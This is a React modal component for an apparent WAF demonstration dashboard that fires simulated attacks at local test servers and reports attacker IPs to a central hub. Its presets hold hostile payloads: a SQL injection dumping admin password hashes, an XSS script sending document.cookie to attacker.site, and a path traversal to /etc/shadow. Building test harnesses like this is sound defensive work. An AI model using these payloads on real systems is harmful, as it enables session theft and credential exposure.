import React, { useState, useEffect } from 'react';
import { 
  X, 
  Play, 
  Terminal, 
  Zap, 
  ShieldAlert, 
  CheckCircle2, 
  Activity, 
  Flame, 
  Radio, 
  Lock,
  Trash2,
  Sparkles
} from 'lucide-react';
import axios from 'axios';

const DEFAULT_HUB_API = import.meta.env.VITE_HUB_API || 
  (typeof window !== 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
    ? 'http://127.0.0.1:8000'
    : 'https://nexusshield.onrender.com');

const DEFAULT_API_KEY = import.meta.env.VITE_NEXUS_API_KEY || 'nexus_dev_key_2026';

const ATTACK_PRESETS = [
  {
    id: 'sqli',
    label: 'SQL Injection',
    type: 'SQL Injection',
    badge: 'Rose',
    payload: "/api/users?id=1' UNION SELECT username, password_hash FROM admin_users--",
    ip: '198.51.100.44'
  },
  {
    id: 'xss',
    label: 'XSS Vector',
    type: 'XSS Vector',
    badge: 'Amber',
    payload: "/comment?author=<script>fetch('//attacker.site/steal?cookie='+document.cookie)</script>",
    ip: '203.0.113.88'
  },
  {
    id: 'path',
    label: 'Path Traversal',
    type: 'Path Traversal',
    badge: 'Cyan',
    payload: "/static/download?file=../../../../etc/shadow",
    ip: '192.0.2.14'
  },
  {
    id: 'dos',
    label: 'DoS Flood Burst',
    type: 'DoS / Flood',
    badge: 'Purple',
    payload: "/login?attempt=burst_flood_100req_sec",
    ip: '45.33.32.156'
  }
];

export default function SimulatorModal({ 
  isOpen, 
  onClose, 
  onRefreshData, 
  hubApi = DEFAULT_HUB_API, 
  apiKey = DEFAULT_API_KEY 
}) {
  const [targetUrl, setTargetUrl] = useState('http://127.0.0.1:3000');
  const [nodeName, setNodeName] = useState('Site-A');
  const [attackType, setAttackType] = useState('SQL Injection');
  const [customIp, setCustomIp] = useState('198.51.100.44');
  const [payload, setPayload] = useState("/api/users?id=1' UNION SELECT username, password_hash FROM admin_users--");
  const [selectedPresetId, setSelectedPresetId] = useState('sqli');
  
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState([]);

  // Close modal on Escape key press
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === 'Escape') onClose();
    };
    if (isOpen) {
      window.addEventListener('keydown', handleKeyDown);
    }
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  const handleSelectPreset = (preset) => {
    setSelectedPresetId(preset.id);
    setAttackType(preset.type);
    setPayload(preset.payload);
    setCustomIp(preset.ip);
  };

  const runSimulation = async () => {
    setIsRunning(true);
    const timestamp = new Date().toLocaleTimeString();
    
    setLogs(prev => [
      ...prev, 
      `[${timestamp}] ⚡ [DISPATCH] Firing simulated ${attackType} to ${targetUrl}...`,
      `[${timestamp}] 🔍 Payload: ${payload}`
    ]);

    try {
      // 1. Direct Hub Report or Spoke Simulation
      if (targetUrl.includes('8000') || targetUrl.includes('onrender')) {
        await axios.post(`${hubApi}/report`, {
          ip_address: customIp,
          client_id: nodeName,
          attack_type: attackType,
          node: nodeName
        }, {
          headers: { 'x-api-key': apiKey }
        });

        setLogs(prev => [
          ...prev, 
          `[${timestamp}] 🛡️ [HUB INTERCEPT] 403 Forbidden! Added ${customIp} to Global Bloom Set.`,
          `[${timestamp}] 📡 [GOSSIP SYNC] Broadcasted SHA-256 Ban Hash to Site-A & Site-B peers.`
        ]);
      } else {
        // Try attacking spoke endpoint
        try {
          const res = await axios.get(`${targetUrl}${payload}`, { timeout: 2000 });
          setLogs(prev => [
            ...prev,
            `[${timestamp}] ⚠️ Target replied with status ${res.status}. Sending backup telemetry report...`
          ]);
        } catch (err) {
          if (err.response && err.response.status === 403) {
            setLogs(prev => [
              ...prev,
              `[${timestamp}] 🛡️ [WAF SUCCESS] HTTP 403 Forbidden! Spoke WAF regex deflected vector.`,
              `[${timestamp}] 🚀 [GOSSIP PROPAGATED] Ban announced globally to NexusHub.`
            ]);
          } else {
            // Also notify hub
            await axios.post(`${hubApi}/report`, {
              ip_address: customIp,
              client_id: nodeName,
              attack_type: attackType,
              node: nodeName
            }, {
              headers: { 'x-api-key': apiKey }
            });
            setLogs(prev => [
              ...prev,
              `[${timestamp}] 🛡️ [HUB RECEIVED] Ban record stored for ${customIp} (${attackType}).`,
              `[${timestamp}] 📡 Distributed to all active tenant nodes.`
            ]);
          }
        }
      }

      // Refresh dashboard data
      if (onRefreshData) {
        setTimeout(onRefreshData, 400);
      }

    } catch (error) {
      setLogs(prev => [
        ...prev,
        `[${timestamp}] ❌ [ERROR] ${error.message}`
      ]);
    } finally {
      setIsRunning(false);
    }
  };

  return (
    <div 
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md transition-all animate-fadeIn"
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <div className="stripe-card w-full max-w-2xl max-h-[92vh] overflow-hidden flex flex-col border border-[#2a3650] shadow-2xl bg-[#0c101a]">
        
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-[#1a2234] bg-[#080b11]">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 rounded-lg bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400">
              <Zap className="w-4 h-4" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white tracking-wide font-mono">
                Spoke Attack Simulator & Stress Panel
              </h2>
              <p className="text-[11px] text-slate-400 font-sans">
                Simulate zero-day vectors to test real-time WAF deflection & peer sync
              </p>
            </div>
          </div>

          <button 
            onClick={onClose}
            className="text-slate-400 hover:text-white p-1.5 rounded-lg hover:bg-[#141b2c] border border-transparent hover:border-slate-700 transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 overflow-y-auto space-y-5 text-xs font-mono">
          
          {/* Preset Attack Vectors */}
          <div>
            <label className="block text-slate-400 mb-2 uppercase font-semibold text-[11px]">
              Preset Attack Vectors
            </label>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              {ATTACK_PRESETS.map((preset) => {
                const isSelected = selectedPresetId === preset.id;
                return (
                  <button
                    key={preset.id}
                    onClick={() => handleSelectPreset(preset)}
                    className={`py-2 px-3 rounded-lg border text-center font-semibold transition-all duration-200 ${
                      isSelected
                        ? 'bg-rose-950/70 text-rose-300 border-rose-500 shadow-[0_0_12px_rgba(244,63,94,0.2)]'
                        : 'bg-[#080b11] text-slate-400 border-[#1a2234] hover:border-slate-700 hover:text-slate-200'
                    }`}
                  >
                    {preset.label}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Form Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            
            {/* Target Node */}
            <div>
              <label className="block text-slate-400 mb-1 font-semibold text-[11px]">Target Node / Endpoint</label>
              <select
                value={targetUrl}
                onChange={(e) => {
                  setTargetUrl(e.target.value);
                  setNodeName(e.target.value.includes('3000') ? 'Site-A' : e.target.value.includes('3001') ? 'Site-B' : 'Global-Hub');
                }}
                className="w-full bg-[#080b11] border border-[#1a2234] rounded-lg p-2.5 text-slate-200 focus:outline-none focus:border-cyan-500/80 font-mono text-xs"
              >
                <option value="http://127.0.0.1:3000">Site A (Spoke Express :3000)</option>
                <option value="http://127.0.0.1:3001">Site B (Spoke Express :3001)</option>
                <option value="http://127.0.0.1:8000">Direct Threat Hub (:8000)</option>
              </select>
            </div>

            {/* Simulated Attacker IP */}
            <div>
              <label className="block text-slate-400 mb-1 font-semibold text-[11px]">Simulated Attacker IP</label>
              <input
                type="text"
                value={customIp}
                onChange={(e) => setCustomIp(e.target.value)}
                className="w-full bg-[#080b11] border border-[#1a2234] rounded-lg p-2.5 text-cyan-300 focus:outline-none focus:border-cyan-500/80 font-mono text-xs"
              />
            </div>
          </div>

          {/* Payload String */}
          <div>
            <label className="block text-slate-400 mb-1 font-semibold text-[11px]">Attack Vector URI Payload</label>
            <input
              type="text"
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              className="w-full bg-[#080b11] border border-[#1a2234] rounded-lg p-2.5 text-rose-300 focus:outline-none focus:border-rose-500/80 font-mono text-xs"
            />
          </div>

          {/* Fire Test Button */}
          <button
            onClick={runSimulation}
            disabled={isRunning}
            className="w-full py-3 bg-gradient-to-r from-rose-600 via-rose-500 to-pink-600 hover:from-rose-500 hover:to-pink-500 text-white font-bold rounded-xl shadow-lg shadow-rose-900/30 flex items-center justify-center space-x-2 transition-all disabled:opacity-50 active:scale-[0.99]"
          >
            <Play className={`w-4 h-4 ${isRunning ? 'animate-spin' : ''}`} />
            <span>{isRunning ? 'Simulating Threat Interception...' : 'Fire Simulated Attack'}</span>
          </button>

          {/* Simulator Console Output */}
          <div>
            <div className="flex items-center justify-between mb-1 text-[11px] text-slate-400">
              <span className="font-semibold uppercase tracking-wider">Live Execution Console</span>
              <button 
                onClick={() => setLogs([])} 
                className="flex items-center space-x-1 text-slate-500 hover:text-slate-300 transition-colors"
              >
                <Trash2 className="w-3 h-3" />
                <span>Clear Console</span>
              </button>
            </div>
            
            <div className="bg-[#06080d] border border-[#131a29] rounded-xl p-3.5 h-36 overflow-y-auto font-mono text-[11px] space-y-1.5 text-slate-300 shadow-inner">
              {logs.length > 0 ? (
                logs.map((msg, i) => (
                  <div key={i} className="leading-relaxed">
                    {msg}
                  </div>
                ))
              ) : (
                <div className="h-full flex items-center justify-center text-slate-600 italic">
                  Select a preset and click "Fire Simulated Attack" to inspect live WAF deflection.
                </div>
              )}
            </div>
          </div>

        </div>

      </div>
    </div>
  );
}

